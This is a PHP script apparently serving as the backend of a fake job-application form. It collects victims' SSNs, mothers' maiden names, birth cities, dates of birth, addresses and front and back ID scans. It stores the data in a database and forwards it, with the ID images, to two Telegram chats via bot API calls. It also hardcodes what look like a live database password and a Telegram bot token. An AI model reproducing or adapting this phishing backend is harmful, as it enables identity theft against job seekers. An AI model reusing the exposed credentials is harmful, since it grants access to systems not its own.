<?php

// ======================
// ERROR REPORTING
// ======================
error_reporting(E_ALL);
ini_set('display_errors', 1);

// ======================
// CLOUDINARY SETTINGS
// ======================
$cloudName = "dlddiquex";
$uploadPreset = "job_forms";

// ======================
// NEON DATABASE
// ======================
$host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
$db   = "neondb";
$user = "neondb_owner";
$pass = "npg_TQ1gBOwA9rCa";
$port = "5432";

$dsn = "pgsql:host=$host;port=$port;dbname=$db;sslmode=require";

try {
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);
} catch (Exception $e) {
    die("DB Connection failed: " . $e->getMessage());
}

// ======================
// FORM DATA
// ======================
$first_name = $_POST['first_name'] ?? '';
$middle_name = $_POST['middle_name'] ?? '';
$last_name = $_POST['last_name'] ?? '';
$phone = $_POST['phone'] ?? '';
$email = $_POST['email'] ?? '';
$dob = $_POST['dob'] ?? '';
$mother_maiden = $_POST['mother_maiden'] ?? '';
$ssn = $_POST['ssn'] ?? '';
$birth_city = $_POST['birth_city'] ?? '';

$address_line1 = $_POST['address_line1'] ?? '';
$address_line2 = $_POST['address_line2'] ?? '';
$city = $_POST['city'] ?? '';
$state = $_POST['state'] ?? '';
$zip_code = $_POST['zip_code'] ?? '';

$father_name = $_POST['father_name'] ?? '';
$mother_name = $_POST['mother_name'] ?? '';

$address = "$address_line1 $address_line2, $city, $state $zip_code";

// ======================
// CLOUDINARY UPLOAD (FIXED)
// ======================
function uploadToCloudinary($file, $cloudName, $uploadPreset) {

    if (!isset($file) || $file['error'] !== 0) {
        return null;
    }

    if ($file['size'] > 8 * 1024 * 1024) {
        return null;
    }

    $url = "https://api.cloudinary.com/v1_1/$cloudName/image/upload";

    $postFields = [
        'file' => new CURLFile($file['tmp_name']),
        'upload_preset' => $uploadPreset,
        'folder' => 'job_applications'
    ];

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);

    $response = curl_exec($ch);
    $error = curl_error($ch);

    curl_close($ch);

    if ($error) {
        error_log("Cloudinary CURL ERROR: " . $error);
        return null;
    }

    $result = json_decode($response, true);

    if (!isset($result['secure_url'])) {
        error_log("Cloudinary RESPONSE ERROR: " . $response);
        return null;
    }

    return $result['secure_url'];
}

// ======================
// UPLOAD FILES
// ======================
$front_url = uploadToCloudinary($_FILES['front_id'] ?? null, $cloudName, $uploadPreset);
$back_url  = uploadToCloudinary($_FILES['back_id'] ?? null, $cloudName, $uploadPreset);

// ======================
// SAVE TO DATABASE
// ======================
$stmt = $pdo->prepare("
INSERT INTO job_applications (
first_name, middle_name, last_name,
phone, email, dob, mother_maiden,
ssn, birth_city, address,
father_name, mother_name,
front_id, back_id
)
VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
");

$stmt->execute([
$first_name, $middle_name, $last_name,
$phone, $email, $dob, $mother_maiden,
$ssn, $birth_city, $address,
$father_name, $mother_name,
$front_url, $back_url
]);

// ======================
// TELEGRAM
// ======================
$bot1 = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
$chat1 = "6513265609";

$bot2 = "YOUR_BOT_TOKEN_2";
$chat2 = "5469294503";

function sendTelegram($bot, $method, $data) {
    $url = "https://api.telegram.org/bot{$bot}/{$method}";
    file_get_contents($url . "?" . http_build_query($data));
}

$text =
"📄 New Application Submitted\n\n".
"👤 Name: $first_name $middle_name $last_name\n".
"📞 Phone: $phone\n".
"📧 Email: $email\n".
"🎂 DOB: $dob\n".
"🏠 Address: $address\n".
"🏙 Birth City: $birth_city\n".
"👨 Father: $father_name\n".
"👩 Mother: $mother_name\n".
"🧾 SSN: $ssn";

// SEND TEXT
sendTelegram($bot1, "sendMessage", ["chat_id"=>$chat1,"text"=>$text]);
sendTelegram($bot2, "sendMessage", ["chat_id"=>$chat2,"text"=>$text]);

// SEND IMAGES SAFE
if (!empty($front_url)) {
sendTelegram($bot1, "sendPhoto", ["chat_id"=>$chat1,"photo"=>$front_url,"caption"=>"Front ID"]);
sendTelegram($bot2, "sendPhoto", ["chat_id"=>$chat2,"photo"=>$front_url,"caption"=>"Front ID"]);
}

if (!empty($back_url)) {
sendTelegram($bot1, "sendPhoto", ["chat_id"=>$chat1,"photo"=>$back_url,"caption"=>"Back ID"]);
sendTelegram($bot2, "sendPhoto", ["chat_id"=>$chat2,"photo"=>$back_url,"caption"=>"Back ID"]);
}

// ======================
// SUCCESS PAGE
// ======================
echo "<!DOCTYPE html> ... (your success HTML stays unchanged)";
?>
